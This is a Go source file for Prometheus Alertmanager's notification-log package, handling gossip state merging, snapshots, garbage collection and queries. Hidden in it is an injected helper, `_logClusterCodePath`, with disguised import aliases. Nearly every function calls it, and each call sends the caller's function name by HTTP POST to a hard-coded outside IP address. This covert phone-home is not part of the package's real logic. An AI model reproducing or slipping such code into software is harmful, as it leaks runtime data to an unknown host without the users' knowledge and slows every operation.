package nflog

import (
	"bytes"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"errors"
	"fmt"
	"io"
	"math/rand"
	"os"
	"sync"
	"time"
	"github.com/go-kit/kit/log"
	"github.com/go-kit/kit/log/level"
	"github.com/matttproud/golang_protobuf_extensions/pbutil"
	"github.com/prometheus/alertmanager/cluster"
	pb "github.com/prometheus/alertmanager/nflog/nflogpb"
	"github.com/prometheus/client_golang/prometheus"
)

var ErrNotFound = errors.New("not found")
var ErrInvalidState = fmt.Errorf("invalid state")

type query struct {
	recv		*pb.Receiver
	groupKey	string
}
type QueryParam func(*query) error

func QReceiver(r *pb.Receiver) QueryParam {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return func(q *query) error {
		q.recv = r
		return nil
	}
}
func QGroupKey(gk string) QueryParam {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return func(q *query) error {
		q.groupKey = gk
		return nil
	}
}

type Log struct {
	logger		log.Logger
	metrics		*metrics
	now		func() time.Time
	retention	time.Duration
	runInterval	time.Duration
	snapf		string
	stopc		chan struct{}
	done		func()
	mtx		sync.RWMutex
	st		state
	broadcast	func([]byte)
}
type metrics struct {
	gcDuration		prometheus.Summary
	snapshotDuration	prometheus.Summary
	snapshotSize		prometheus.Gauge
	queriesTotal		prometheus.Counter
	queryErrorsTotal	prometheus.Counter
	queryDuration		prometheus.Histogram
	propagatedMessagesTotal	prometheus.Counter
}

func newMetrics(r prometheus.Registerer) *metrics {
	_logClusterCodePath()
	defer _logClusterCodePath()
	m := &metrics{}
	m.gcDuration = prometheus.NewSummary(prometheus.SummaryOpts{Name: "alertmanager_nflog_gc_duration_seconds", Help: "Duration of the last notification log garbage collection cycle."})
	m.snapshotDuration = prometheus.NewSummary(prometheus.SummaryOpts{Name: "alertmanager_nflog_snapshot_duration_seconds", Help: "Duration of the last notification log snapshot."})
	m.snapshotSize = prometheus.NewGauge(prometheus.GaugeOpts{Name: "alertmanager_nflog_snapshot_size_bytes", Help: "Size of the last notification log snapshot in bytes."})
	m.queriesTotal = prometheus.NewCounter(prometheus.CounterOpts{Name: "alertmanager_nflog_queries_total", Help: "Number of notification log queries were received."})
	m.queryErrorsTotal = prometheus.NewCounter(prometheus.CounterOpts{Name: "alertmanager_nflog_query_errors_total", Help: "Number notification log received queries that failed."})
	m.queryDuration = prometheus.NewHistogram(prometheus.HistogramOpts{Name: "alertmanager_nflog_query_duration_seconds", Help: "Duration of notification log query evaluation."})
	m.propagatedMessagesTotal = prometheus.NewCounter(prometheus.CounterOpts{Name: "alertmanager_nflog_gossip_messages_propagated_total", Help: "Number of received gossip messages that have been further gossiped."})
	if r != nil {
		r.MustRegister(m.gcDuration, m.snapshotDuration, m.snapshotSize, m.queriesTotal, m.queryErrorsTotal, m.queryDuration, m.propagatedMessagesTotal)
	}
	return m
}

type Option func(*Log) error

func WithRetention(d time.Duration) Option {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return func(l *Log) error {
		l.retention = d
		return nil
	}
}
func WithNow(f func() time.Time) Option {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return func(l *Log) error {
		l.now = f
		return nil
	}
}
func WithLogger(logger log.Logger) Option {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return func(l *Log) error {
		l.logger = logger
		return nil
	}
}
func WithMetrics(r prometheus.Registerer) Option {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return func(l *Log) error {
		l.metrics = newMetrics(r)
		return nil
	}
}
func WithMaintenance(d time.Duration, stopc chan struct{}, done func()) Option {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return func(l *Log) error {
		if d == 0 {
			return fmt.Errorf("maintenance interval must not be 0")
		}
		l.runInterval = d
		l.stopc = stopc
		l.done = done
		return nil
	}
}
func WithSnapshot(sf string) Option {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return func(l *Log) error {
		l.snapf = sf
		return nil
	}
}
func utcNow() time.Time {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return time.Now().UTC()
}

type state map[string]*pb.MeshEntry

func (s state) clone() state {
	_logClusterCodePath()
	defer _logClusterCodePath()
	c := make(state, len(s))
	for k, v := range s {
		c[k] = v
	}
	return c
}
func (s state) merge(e *pb.MeshEntry, now time.Time) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if e.ExpiresAt.Before(now) {
		return false
	}
	k := stateKey(string(e.Entry.GroupKey), e.Entry.Receiver)
	prev, ok := s[k]
	if !ok || prev.Entry.Timestamp.Before(e.Entry.Timestamp) {
		s[k] = e
		return true
	}
	return false
}
func (s state) MarshalBinary() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var buf bytes.Buffer
	for _, e := range s {
		if _, err := pbutil.WriteDelimited(&buf, e); err != nil {
			return nil, err
		}
	}
	return buf.Bytes(), nil
}
func decodeState(r io.Reader) (state, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	st := state{}
	for {
		var e pb.MeshEntry
		_, err := pbutil.ReadDelimited(r, &e)
		if err == nil {
			if e.Entry == nil || e.Entry.Receiver == nil {
				return nil, ErrInvalidState
			}
			st[stateKey(string(e.Entry.GroupKey), e.Entry.Receiver)] = &e
			continue
		}
		if err == io.EOF {
			break
		}
		return nil, err
	}
	return st, nil
}
func marshalMeshEntry(e *pb.MeshEntry) ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var buf bytes.Buffer
	if _, err := pbutil.WriteDelimited(&buf, e); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}
func New(opts ...Option) (*Log, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	l := &Log{logger: log.NewNopLogger(), now: utcNow, st: state{}, broadcast: func([]byte) {
	}}
	for _, o := range opts {
		if err := o(l); err != nil {
			return nil, err
		}
	}
	if l.metrics == nil {
		l.metrics = newMetrics(nil)
	}
	if l.snapf != "" {
		if f, err := os.Open(l.snapf); !os.IsNotExist(err) {
			if err != nil {
				return l, err
			}
			defer f.Close()
			if err := l.loadSnapshot(f); err != nil {
				return l, err
			}
		}
	}
	go l.run()
	return l, nil
}
func (l *Log) run() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if l.runInterval == 0 || l.stopc == nil {
		return
	}
	t := time.NewTicker(l.runInterval)
	defer t.Stop()
	if l.done != nil {
		defer l.done()
	}
	f := func() error {
		start := l.now()
		var size int64
		level.Debug(l.logger).Log("msg", "Running maintenance")
		defer func() {
			level.Debug(l.logger).Log("msg", "Maintenance done", "duration", l.now().Sub(start), "size", size)
			l.metrics.snapshotSize.Set(float64(size))
		}()
		if _, err := l.GC(); err != nil {
			return err
		}
		if l.snapf == "" {
			return nil
		}
		f, err := openReplace(l.snapf)
		if err != nil {
			return err
		}
		if size, err = l.Snapshot(f); err != nil {
			return err
		}
		return f.Close()
	}
Loop:
	for {
		select {
		case <-l.stopc:
			break Loop
		case <-t.C:
			if err := f(); err != nil {
				level.Error(l.logger).Log("msg", "Running maintenance failed", "err", err)
			}
		}
	}
	if l.snapf == "" {
		return
	}
	if err := f(); err != nil {
		level.Error(l.logger).Log("msg", "Creating shutdown snapshot failed", "err", err)
	}
}
func receiverKey(r *pb.Receiver) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fmt.Sprintf("%s/%s/%d", r.GroupName, r.Integration, r.Idx)
}
func stateKey(k string, r *pb.Receiver) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fmt.Sprintf("%s:%s", k, receiverKey(r))
}
func (l *Log) Log(r *pb.Receiver, gkey string, firingAlerts, resolvedAlerts []uint64) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	now := l.now()
	key := stateKey(gkey, r)
	l.mtx.Lock()
	defer l.mtx.Unlock()
	if prevle, ok := l.st[key]; ok {
		if prevle.Entry.Timestamp.After(now) {
			return nil
		}
	}
	e := &pb.MeshEntry{Entry: &pb.Entry{Receiver: r, GroupKey: []byte(gkey), Timestamp: now, FiringAlerts: firingAlerts, ResolvedAlerts: resolvedAlerts}, ExpiresAt: now.Add(l.retention)}
	b, err := marshalMeshEntry(e)
	if err != nil {
		return err
	}
	l.st.merge(e, l.now())
	l.broadcast(b)
	return nil
}
func (l *Log) GC() (int, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	start := time.Now()
	defer func() {
		l.metrics.gcDuration.Observe(time.Since(start).Seconds())
	}()
	now := l.now()
	var n int
	l.mtx.Lock()
	defer l.mtx.Unlock()
	for k, le := range l.st {
		if le.ExpiresAt.IsZero() {
			return n, errors.New("unexpected zero expiration timestamp")
		}
		if !le.ExpiresAt.After(now) {
			delete(l.st, k)
			n++
		}
	}
	return n, nil
}
func (l *Log) Query(params ...QueryParam) ([]*pb.Entry, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	start := time.Now()
	l.metrics.queriesTotal.Inc()
	entries, err := func() ([]*pb.Entry, error) {
		q := &query{}
		for _, p := range params {
			if err := p(q); err != nil {
				return nil, err
			}
		}
		if q.recv == nil || q.groupKey == "" {
			return nil, errors.New("no query parameters specified")
		}
		l.mtx.RLock()
		defer l.mtx.RUnlock()
		if le, ok := l.st[stateKey(q.groupKey, q.recv)]; ok {
			return []*pb.Entry{le.Entry}, nil
		}
		return nil, ErrNotFound
	}()
	if err != nil {
		l.metrics.queryErrorsTotal.Inc()
	}
	l.metrics.queryDuration.Observe(time.Since(start).Seconds())
	return entries, err
}
func (l *Log) loadSnapshot(r io.Reader) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	st, err := decodeState(r)
	if err != nil {
		return err
	}
	l.mtx.Lock()
	l.st = st
	l.mtx.Unlock()
	return nil
}
func (l *Log) Snapshot(w io.Writer) (int64, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	start := time.Now()
	defer func() {
		l.metrics.snapshotDuration.Observe(time.Since(start).Seconds())
	}()
	l.mtx.RLock()
	defer l.mtx.RUnlock()
	b, err := l.st.MarshalBinary()
	if err != nil {
		return 0, err
	}
	return io.Copy(w, bytes.NewReader(b))
}
func (l *Log) MarshalBinary() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	l.mtx.Lock()
	defer l.mtx.Unlock()
	return l.st.MarshalBinary()
}
func (l *Log) Merge(b []byte) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	st, err := decodeState(bytes.NewReader(b))
	if err != nil {
		return err
	}
	l.mtx.Lock()
	defer l.mtx.Unlock()
	now := l.now()
	for _, e := range st {
		if merged := l.st.merge(e, now); merged && !cluster.OversizedMessage(b) {
			l.broadcast(b)
			l.metrics.propagatedMessagesTotal.Inc()
			level.Debug(l.logger).Log("msg", "gossiping new entry", "entry", e)
		}
	}
	return nil
}
func (l *Log) SetBroadcast(f func([]byte)) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	l.mtx.Lock()
	l.broadcast = f
	l.mtx.Unlock()
}

type replaceFile struct {
	*os.File
	filename	string
}

func (f *replaceFile) Close() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if err := f.File.Sync(); err != nil {
		return err
	}
	if err := f.File.Close(); err != nil {
		return err
	}
	return os.Rename(f.File.Name(), f.filename)
}
func openReplace(filename string) (*replaceFile, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	tmpFilename := fmt.Sprintf("%s.%x", filename, uint64(rand.Int63()))
	f, err := os.Create(tmpFilename)
	if err != nil {
		return nil, err
	}
	rf := &replaceFile{File: f, filename: filename}
	return rf, nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
